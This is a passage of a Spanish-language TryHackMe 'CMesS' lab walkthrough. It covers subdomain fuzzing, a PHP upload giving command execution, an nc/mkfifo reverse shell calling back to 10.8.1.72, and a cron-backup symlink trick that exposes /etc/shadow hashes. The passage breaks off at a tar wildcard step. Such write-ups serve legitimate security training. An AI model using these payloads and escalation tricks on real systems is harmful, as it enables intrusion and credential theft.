/tmp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/1a &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/0001 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/1x1transparent &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/1px &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/1d &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/1_1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/1pixel &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/0001-exploits &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/01_hello &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/1-1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/1st &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/00000001 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;wfuzz---subdomains&#34;&gt;WFUZZ - SUBDOMAINS&lt;/h2&gt;
&lt;p&gt;Utilizamos wfuzz para poder enumerar los subdominios de la maquina, encontramos &lt;code&gt;***&lt;/code&gt; de subdominio.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/cmess# wfuzz -c -w subdomains-top1mil-5000.txt -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://cmess.thm&amp;#34;&lt;/span&gt; -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host: FUZZ.cmess.thm&amp;#34;&lt;/span&gt; --hl &lt;span class=&#34;m&#34;&gt;107&lt;/span&gt;

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s documentation &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://cmess.thm/
Total requests: &lt;span class=&#34;nv&#34;&gt;5000&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;===================================================================&lt;/span&gt;
ID           Response   Lines    Word     Chars       &lt;span class=&#34;nv&#34;&gt;Payload&lt;/span&gt;                                                  
&lt;span class=&#34;o&#34;&gt;===================================================================&lt;/span&gt;

000000019:   &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; L     &lt;span class=&#34;m&#34;&gt;104&lt;/span&gt; W    &lt;span class=&#34;m&#34;&gt;934&lt;/span&gt; Ch      &lt;span class=&#34;s2&#34;&gt;&amp;#34;***&amp;#34;&lt;/span&gt;                                                    
000002700:   &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; L     &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; W     &lt;span class=&#34;m&#34;&gt;422&lt;/span&gt; Ch      &lt;span class=&#34;s2&#34;&gt;&amp;#34;m.&amp;#34;&lt;/span&gt;                                                     
000002795:   &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; L     &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; W     &lt;span class=&#34;m&#34;&gt;422&lt;/span&gt; Ch      &lt;span class=&#34;s2&#34;&gt;&amp;#34;ns2.cl.bellsouth.net.&amp;#34;&lt;/span&gt;                                  
000002883:   &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; L     &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; W     &lt;span class=&#34;m&#34;&gt;422&lt;/span&gt; Ch      &lt;span class=&#34;s2&#34;&gt;&amp;#34;ns1.viviotech.net.&amp;#34;&lt;/span&gt;                                     
000002885:   &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; L     &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; W     &lt;span class=&#34;m&#34;&gt;422&lt;/span&gt; Ch      &lt;span class=&#34;s2&#34;&gt;&amp;#34;ns2.viviotech.net.&amp;#34;&lt;/span&gt;                                     
000003050:   &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; L     &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; W     &lt;span class=&#34;m&#34;&gt;422&lt;/span&gt; Ch      &lt;span class=&#34;s2&#34;&gt;&amp;#34;ns3.cl.bellsouth.net.&amp;#34;&lt;/span&gt;                                  
000004081:   &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; L     &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; W     &lt;span class=&#34;m&#34;&gt;422&lt;/span&gt; Ch      &lt;span class=&#34;s2&#34;&gt;&amp;#34;ferrari.fortwayne.com.&amp;#34;&lt;/span&gt;                                 
000004082:   &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; L     &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; W     &lt;span class=&#34;m&#34;&gt;422&lt;/span&gt; Ch      &lt;span class=&#34;s2&#34;&gt;&amp;#34;jordan.fortwayne.com.&amp;#34;&lt;/span&gt;                                  
000004083:   &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; L     &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; W     &lt;span class=&#34;m&#34;&gt;422&lt;/span&gt; Ch      &lt;span class=&#34;s2&#34;&gt;&amp;#34;quatro.oweb.com.&amp;#34;&lt;/span&gt;                                       

Total time: 131.3119
Processed Requests: &lt;span class=&#34;m&#34;&gt;5000&lt;/span&gt;
Filtered Requests: &lt;span class=&#34;m&#34;&gt;4991&lt;/span&gt;
Requests/sec.: 38.07726
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;cmessthm&#34;&gt;***.cmess.thm&lt;/h2&gt;
&lt;p&gt;En el subdominio dev encontramos una contraseña del correo andre.&lt;br /&gt;
&lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_184346.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell---www-data&#34;&gt;SHELL - www-data&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales en el panel de administracion (/admin) con las credenciales que tenemos, una vez dentro subimos un archivo PHP de prueba para verificar que podamos ejecutar comandos, el archivo se subió en (/assets/).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; 

&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Testing if i can run commands:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ls &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_185257.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que nuestro codigo se ejecuto:&lt;br /&gt;
&lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_185320.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Editamos el codigo para ejecutar una shell inversa:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; 
&lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.8.1.72 7878 &amp;gt;/tmp/f&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt;:)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_185920.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;andre---user&#34;&gt;Andre - User&lt;/h2&gt;
&lt;p&gt;Enumeramos la maquina en busca de archivos interesantes, en la carpeta /opt encontramos un backup de la contraseña de Andre.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@cmess:/$ ls -lah opt
ls -lah opt
total 12K
drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root 4.0K Feb  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 18:54 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; root root 4.0K Feb  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 17:57 ..
-rwxrwxrwx  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;36&lt;/span&gt; Feb  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 18:54 .password.bak
www-data@cmess:/$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; opt
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; opt
www-data@cmess:/opt$ cat .password.bak
cat .password.bak
andres backup password
UQ&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;P6
www-data@cmess:/opt$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos &amp;lsquo;su&amp;rsquo;, obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_193421.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Dentro de los archivos de la carpeta &lt;code&gt;/tmp&lt;/code&gt; encontramos un archivo comprimido, de lo que parece &lt;code&gt;/home/andre/backup/&lt;/code&gt;, que, la realiza el usuario root cada minuto. Para ver el cambio del archivo utilizamos &lt;code&gt;date&lt;/code&gt; para ver la fecha de creacion y hora. Con lo anterior, renombramos la carpeta &lt;code&gt;backup&lt;/code&gt; a &lt;code&gt;backup_bak&lt;/code&gt;, creamos un symlink hacia la carpeta &lt;code&gt;/root/&lt;/code&gt;, el usuario root realizara un backup de la carpeta /root/.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;O simplemente utilizar &lt;code&gt;cat /etc/crontab&lt;/code&gt; para ver los crons xD&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_195352.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al pasar un minuto, vemos que la hora de creacion cambio y al extraer los archivos podemos ver nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_195832.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;De la misma forma podemos obtener la contraseña del usuario root (crackeada) haciendo un symlink hacia la carpeta /etc/.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;andre@cmess:~$ ln -s /etc/ backup
andre@cmess:~$ ls -lah
total 3.0M
drwxr-x--- &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; andre andre 4.0K Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 18:27 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root  root  4.0K Feb  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 18:00 ..
lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; andre andre   &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 18:27 backup -&amp;gt; /etc/
drwxr-x--- &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; andre andre 4.0K Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 17:44 backup_bak
lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root  root     &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Feb  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 18:48 .bash_history -&amp;gt; /dev/null
-rwxr-x--- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; andre andre  &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Feb  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 18:00 .bash_logout
-rwxr-x--- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; andre andre 3.7K Feb  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 18:00 .bashrc
drwxr-x--- &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; andre andre 4.0K Feb  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 18:01 .cache
-rwxr-x--- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; andre andre  &lt;span class=&#34;m&#34;&gt;655&lt;/span&gt; Feb  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 18:00 .profile
-rwxrwxr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; andre andre 3.0M Aug &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 11:38 pspy64
lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root  root     &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Feb  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 18:48 .sudo_as_admin_successful -&amp;gt; /dev/null
-rwxr-x--- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; andre andre   &lt;span class=&#34;m&#34;&gt;38&lt;/span&gt; Feb  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 18:46 user.txt
-rwxr-x--- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; andre andre  &lt;span class=&#34;m&#34;&gt;635&lt;/span&gt; Feb  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 11:00 .viminfo
andre@cmess:~$ date
Fri Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 18:27:05 PST &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
andre@cmess:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Descomprimimos el archivo y obtenemos la contraseña encriptada:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;andre@cmess:/tmp$ ls &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep sha
gshadow
gshadow-
shadow
shadow-
andre@cmess:/tmp$ cat shadow
root:&lt;span class=&#34;nv&#34;&gt;$6$W&lt;/span&gt;.gDTDR8&lt;span class=&#34;nv&#34;&gt;$XXB79ORIcggP9&lt;/span&gt;.Cl2HzbUf&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;sdXoYOhB7Da9mFPcca5a3DyKG1:18299:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18299:0:99999:7:::
uuidd:*:18299:0:99999:7:::
andre:&lt;span class=&#34;nv&#34;&gt;$6$GeMRsVKt$KEQmO&lt;/span&gt;.oV7yzpLOVXjDX&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;uzhMTMl5J8rstkFQ1QD3/dLFS1yAMqj1kbiQWYvQ8.:18299:0:99999:7:::
mysql:!:18299:0:99999:7:::
sshd:*:18299:0:99999:7:::
andre@cmess:/tmp$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell---root&#34;&gt;SHELL - ROOT&lt;/h2&gt;
&lt;p&gt;Para obtener una shell con el usuario root utilizamos las &amp;lsquo;wildcards&amp;rsquo; para ejecutar una shell inversa. Creamos un archivo con nuestra shell inversa y las &amp;lsquo;wildcards&amp;rsquo; que se ejecutarán junto con el comando tar:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
